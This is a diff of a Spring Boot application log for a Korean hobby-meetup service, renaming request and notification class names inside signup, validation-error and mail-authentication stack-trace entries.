@@ -30,11 +30,11 @@
 2024-11-25 14:31:35.781  o.a.c.c.C.[.[.[/] - Initializing Spring DispatcherServlet 'dispatcherServlet' 
 2024-11-25 14:31:35.781  o.s.w.s.DispatcherServlet - Initializing Servlet 'dispatcherServlet' 
 2024-11-25 14:31:35.782  o.s.w.s.DispatcherServlet - Completed initialization in 1 ms 
-2024-11-25 14:32:26.477  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.JoinRequest@12f3cbeb 
+2024-11-25 14:32:26.477  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.UserJoinRequest@12f3cbeb
 2024-11-25 14:32:26.480  c.e.h.c.UserController - 회원가입 중 오류 발생: 이미 사용중인 아이디 입니다. 
-2024-11-25 14:32:40.069  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.JoinRequest@61daa91a 
+2024-11-25 14:32:40.069  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.UserJoinRequest@61daa91a
 2024-11-25 14:32:40.071  c.e.h.c.UserController - 회원가입 중 오류 발생: 이미 사용중인 아이디 입니다. 
-2024-11-25 14:32:50.789  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.JoinRequest@133fb9ae 
+2024-11-25 14:32:50.789  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.UserJoinRequest@133fb9ae
 2024-11-25 14:32:50.905  c.e.h.c.UserController - 회원가입 처리 완료: aaaa 
 2024-11-25 14:33:59.734  c.e.h.j.JWTFilter - JWTFilter - Request URI: /user/my-info 
 2024-11-25 14:33:59.754  c.e.h.j.JWTFilter - JWTFilter - UserId: aaaa, Role: ROLE_USER 
@@ -58,7 +58,7 @@
 2024-11-25 14:58:27.808  c.e.h.j.JWTFilter - JWTFilter - UserId: aaaa, Role: ROLE_USER 
 2024-11-25 14:58:27.808  c.e.h.j.JWTFilter - JWTFilter - Token parsed successfully for UserId: aaaa, Role: ROLE_USER 
 2024-11-25 14:58:27.818  c.e.h.c.ExceptionController - 새 비밀번호는 최소 8자리 이상이어야 합니다. 
-2024-11-25 14:58:27.821  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [org.springframework.web.bind.MethodArgumentNotValidException: Validation failed for argument [0] in public org.springframework.http.ResponseEntity<java.lang.String> com.example.hobbyheavy.controller.UserController.updatePassword(com.example.hobbyheavy.dto.request.PasswordUpdateRequest,org.springframework.security.core.Authentication): [Field error in object 'passwordUpdateRequest' on field 'newPassword': rejected value [asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf]; codes [Size.passwordUpdateRequest.newPassword,Size.newPassword,Size.java.lang.String,Size]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [passwordUpdateRequest.newPassword,newPassword]; arguments []; default message [newPassword],100,8]; default message [새 비밀번호는 최소 8자리 이상이어야 합니다.]] ] 
+2024-11-25 14:58:27.821  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [org.springframework.web.bind.MethodArgumentNotValidException: Validation failed for argument [0] in public org.springframework.http.ResponseEntity<java.lang.String> com.example.hobbyheavy.controller.UserController.updatePassword(com.example.hobbyheavy.dto.request.UserPwUpdateRequest,org.springframework.security.core.Authentication): [Field error in object 'passwordUpdateRequest' on field 'newPassword': rejected value [asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf]; codes [Size.passwordUpdateRequest.newPassword,Size.newPassword,Size.java.lang.String,Size]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [passwordUpdateRequest.newPassword,newPassword]; arguments []; default message [newPassword],100,8]; default message [새 비밀번호는 최소 8자리 이상이어야 합니다.]] ]
 2024-11-25 15:05:09.134  o.s.o.j.LocalContainerEntityManagerFactoryBean - Closing JPA EntityManagerFactory for persistence unit 'default' 
 2024-11-25 15:05:09.136  c.z.h.HikariDataSource - HikariPool-1 - Shutdown initiated... 
 2024-11-25 15:05:09.138  c.z.h.HikariDataSource - HikariPool-1 - Shutdown completed. 
@@ -138,8 +138,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:52)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:52)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -308,8 +308,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:52)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:52)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -478,8 +478,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:52)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:52)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -648,8 +648,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:52)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:52)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -817,8 +817,8 @@ Caused by: jakarta.mail.AuthenticationFailedException: 534-5.7.9 Application-spe
 2024-11-25 16:00:21.699  c.e.h.e.GlobalExceptionHandler - 예기치 못한 예외 발생: No static resource . 
 2024-11-25 16:00:21.700  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [org.springframework.web.servlet.resource.NoResourceFoundException: No static resource .] 
 2024-11-25 16:00:48.388  c.e.h.c.ExceptionController - 비밀번호는 최소 8자리 이상이어야 합니다. 
-2024-11-25 16:00:48.389  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [org.springframework.web.bind.MethodArgumentNotValidException: Validation failed for argument [0] in public org.springframework.http.ResponseEntity<java.lang.String> com.example.hobbyheavy.controller.UserController.joinUser(com.example.hobbyheavy.dto.request.JoinRequest): [Field error in object 'joinRequest' on field 'password': rejected value [ehddnr]; codes [Size.joinRequest.password,Size.password,Size.java.lang.String,Size]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [joinRequest.password,password]; arguments []; default message [password],100,8]; default message [비밀번호는 최소 8자리 이상이어야 합니다.]] ] 
-2024-11-25 16:01:00.312  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.JoinRequest@45fca7b0 
+2024-11-25 16:00:48.389  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [org.springframework.web.bind.MethodArgumentNotValidException: Validation failed for argument [0] in public org.springframework.http.ResponseEntity<java.lang.String> com.example.hobbyheavy.controller.UserController.joinUser(com.example.hobbyheavy.dto.request.UserJoinRequest): [Field error in object 'userJoinRequest' on field 'password': rejected value [ehddnr]; codes [Size.userJoinRequest.password,Size.password,Size.java.lang.String,Size]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [userJoinRequest.password,password]; arguments []; default message [password],100,8]; default message [비밀번호는 최소 8자리 이상이어야 합니다.]] ]
+2024-11-25 16:01:00.312  c.e.h.c.UserController - 회원가입 요청: com.example.hobbyheavy.dto.request.UserJoinRequest@45fca7b0
 2024-11-25 16:01:00.399  c.e.h.c.UserController - 회원가입 처리 완료: kwon 
 2024-11-25 16:02:08.643  c.e.h.j.JWTFilter - JWTFilter - Request URI: /meetup 
 2024-11-25 16:02:08.644  c.e.h.j.JWTFilter - JWTFilter - Access token expired for token: eyJhbGciOiJIUzI1NiJ9.eyJjYXRlZ29yeSI6ImFjY2VzcyIsInVzZXJuYW1lIjoiMTIzNCIsInJvbGUiOiJST0xFX1VTRVIiLCJpYXQiOjE3MzIyNjY5NTEsImV4cCI6MTczMjI3Mjk1MX0.UXbdkUuXE2vu2DTInOtGltJv8-oOkb8u9jC51dMAC1Q 
@@ -842,8 +842,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:52)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:52)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
